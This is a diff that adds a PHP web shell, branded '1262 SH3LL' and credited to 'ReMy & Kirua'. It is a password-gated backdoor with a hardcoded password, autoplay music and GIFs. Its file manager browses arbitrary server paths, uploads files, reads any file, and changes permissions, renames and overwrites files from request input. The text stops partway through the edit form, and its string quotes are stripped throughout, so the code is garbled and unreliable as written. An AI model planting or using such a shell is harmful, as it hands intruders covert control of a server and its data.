@@ -1,0 +1,188 @@
+<?php
+$pass = "1262";
+session_start();
+?>
+<!DOCTYPE HTML>
+<html><head>
+<title>1262 SH3LL</title>
+
+<meta property="og:image" content="https://media2.giphy.com/media/148fTgQXsF3o3K/giphy.gif">
+<link href="data:image/x-icon;base64,AAABAAEAEBAAAAAAAABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAC+AAAAvgAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAAAAAAAAAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAD/AAAA/wAAAP8AAAD/AAAABwAAAAAAAAAAAAAABwAAAP8AAAD/AAAA/wAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAD/AAAA/wAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACSAAAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAACSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPcAAAD/AAAA/wAAAPcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/wAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//8AAP//AACAAQAAwYMAAMPDAADjxwAA5+cAAPfvAAD4HwAA+B8AAPw/AAD8PwAA/n8AAP//AAD//wAA//8AAA==" rel="icon" type="image/x-icon">
+<style>
+body{font-family: "Orbitron", cursive;background-color: black;}
+input[type=password]{border: 2px solid #00b2ee;border-radius: 4px;background-color: black;color: white;}
+input::-webkit-input-placeholder{color:red;}
+textarea:-moz-placeholder{color:#00b2ee;}
+</style>
+	<meta http-equiv="Content-Type" content="text/html; charset=windows-1256" />
+</head><body>
+<?php
+if (!empty($_GET[ action ]) &&  $_GET[ action ] == "logout") {session_destroy();unset ($_SESSION[ pass ]);}
+ 
+$path_name = pathinfo($_SERVER[ PHP_SELF ]);
+$this_script = $path_name[ basename ];
+if (empty($_SESSION[ pass ])) {$_SESSION[ pass ]=  ;}
+if (empty($_POST[ pass ])) {$_POST[ pass ]=  ;}
+if ( $_SESSION[ pass ]!== $pass)
+{
+    if ($_POST[ pass ] == $pass) {$_SESSION[ pass ] = $pass; }
+    else
+    {
+        echo  
+        <audio id="song" source="mp3" src="https://d.top4top.net/m_657sj7ol1.mp3" type="audio/mp3" autoplay="autoplay" loop="loop"></audio>
+        <script>
+        var snd = document.getElementById("song");
+        snd.volume = 0.3;
+        </script>
+        <center>
+        <img src="https://media.giphy.com/media/hQGwNDkBZedmU/giphy.gif"/>
+               <br>
+
+    
+</div>
+
+        <div style="font-color:#3B0B17;"><form action=" .$_SERVER[ PHP_SELF ]. " method="post"><input name="pass" placeholder="You shall not pass !" style="text-align:center;
+width:350px;height:30px;font-size:20px;" type="password"></form></div>
+        </center> ;
+        exit;}}
+?>
+
+<?php
+error_reporting(0);
+set_time_limit(0);
+
+if(get_magic_quotes_gpc()){
+foreach($_POST as $key=>$value){
+$_POST[$key] = stripslashes($value);
+}
+}
+echo  <!DOCTYPE HTML>
+<html>
+<head>
+<link href="" rel="stylesheet" type="text/css">
+<title>R2MY SHELL</title>
+<link href="data:image/x-icon;base64,AAABAAEAEBAAAAAAAABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAC+AAAAvgAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAAAAAAAAAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAD/AAAA/wAAAP8AAAD/AAAABwAAAAAAAAAAAAAABwAAAP8AAAD/AAAA/wAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAD/AAAA/wAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACSAAAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAACSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPcAAAD/AAAA/wAAAPcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/wAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//8AAP//AACAAQAAwYMAAMPDAADjxwAA5+cAAPfvAAD4HwAA+B8AAPw/AAD8PwAA/n8AAP//AAD//wAA//8AAA==" rel="icon" type="image/x-icon"><title>cked / Ha</title>
+<meta name="keywords" content="Shell By ReMy & Kirua">
+<meta name="description" content="Shell By Remy & Kirua">
+<meta name="author" content="Remy & kirua">
+<link href="https://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet">
+<style>
+body{
+font-family: "Orbitron", cursive;
+background-color: black;
+color:white;
+}
+#content tr:hover{
+background-color: #3B0B17;
+text-shadow:0px 0px 10px #fff;
+}
+#content .first{
+background-color: #3B0B17 ;
+table{
+border: 1px #000000 dotted;
+}
+a{
+color:white;
+text-decoration: none;
+}
+a:hover{
+color:#3B0B17;
+text-shadow:0px 0px 10px #ffffff;
+}
+input,select,textarea{
+border: 0px #23b80c solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+}
+</style>
+</head>
+<body>
+<h1><center><font color="#3B0B17" face="Orbitron">12 62  SH3LL</font></center></h1>
+<center><img src="https://media.giphy.com/media/S7IB9vgHqgPsI/giphy.gif"><center>
+<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+ 
+<tr><td><font color="#3B0B17">Path :</font>  ;
+if(isset($_GET[ path ])){
+$path = $_GET[ path ];
+}else{
+$path = getcwd();
+}
+$path = str_replace( \\ , / ,$path);
+$paths = explode( / ,$path);
+
+foreach($paths as $id=>$pat){
+if($pat ==    && $id == 0){
+$a = true;
+echo  <a href="?path=/">/</a> ;
+continue;
+}
+if($pat ==   ) continue;
+echo  <a href="?path= ;
+for($i=0;$i<=$id;$i++){
+echo "$paths[$i]";
+if($i != $id) echo "/";
+}
+echo  "> .$pat. </a>/ ;
+}
+echo  </td></tr><tr><td> ;
+if(isset($_FILES[ file ])){
+if(copy($_FILES[ file ][ tmp_name ],$path. / .$_FILES[ file ][ name ])){
+echo  <font color="#green">Upload Done</font><br /> ;
+}else{
+echo  <font color="red">Upload Failed</font><br/> ;
+}
+}
+echo  <form enctype="multipart/form-data" method="POST">
+<font color="white">File Upload :</font> <input type="file" name="file" />
+<input type="submit" value="Upload" />
+</form>
+</td></tr> ;
+if(isset($_GET[ filesrc ])){
+echo "<tr><td>Current File : ";
+echo $_GET[ filesrc ];
+echo  </tr></td></table><br /> ;
+echo( <pre> .htmlspecialchars(file_get_contents($_GET[ filesrc ])). </pre> );
+}elseif(isset($_GET[ option ]) && $_POST[ opt ] !=  delete ){
+echo  </table><br /><center> .$_POST[ path ]. <br /><br /> ;
+if($_POST[ opt ] ==  chmod ){
+if(isset($_POST[ perm ])){
+if(chmod($_POST[ path ],$_POST[ perm ])){
+echo  <font color="#3B0B17">Change Permission Done</font><br/> ;
+}else{
+echo  <font color="#3B0B17">Change Permission Failed</font><br /> ;
+}
+}
+echo  <form method="POST">
+Permission : <input name="perm" type="text" size="4" value=" .substr(sprintf( %o , fileperms($_POST[ path ])), -4). " />
+<input type="hidden" name="path" value=" .$_POST[ path ]. ">
+<input type="hidden" name="opt" value="chmod">
+<input type="submit" value="Go" />
+</form> ;
+}elseif($_POST[ opt ] ==  rename ){
+if(isset($_POST[ newname ])){
+if(rename($_POST[ path ],$path. / .$_POST[ newname ])){
+echo  <font color="#3B0B17">Rename Done</font><br/> ;
+}else{
+echo  <font color="#3B0B17">Rename Failed</font><br /> ;
+}
+$_POST[ name ] = $_POST[ newname ];
+}
+echo  <form method="POST">
+New Name : <input name="newname" type="text" size="20" value=" .$_POST[ name ]. " />
+<input type="hidden" name="path" value=" .$_POST[ path ]. ">
+<input type="hidden" name="opt" value="rename">
+<input type="submit" value="Go" />
+</form> ;
+}elseif($_POST[ opt ] ==  edit ){
+if(isset($_POST[ src ])){
+$fp = fopen($_POST[ path ], w );
+if(fwrite($fp,$_POST[ src ])){
+echo  <font color="#3B0B17">Done Edit File</font><br/> ;
+}else{
+echo  <font color="#3B0B17">Fail Edit File</font><br/> ;
+}
+fclose($fp);
+}
+echo  <form method="POST">
+<textarea cols=80 rows=20 name="src"> .htmlspecialchars(file_get_contents($_POST[ path ])). 
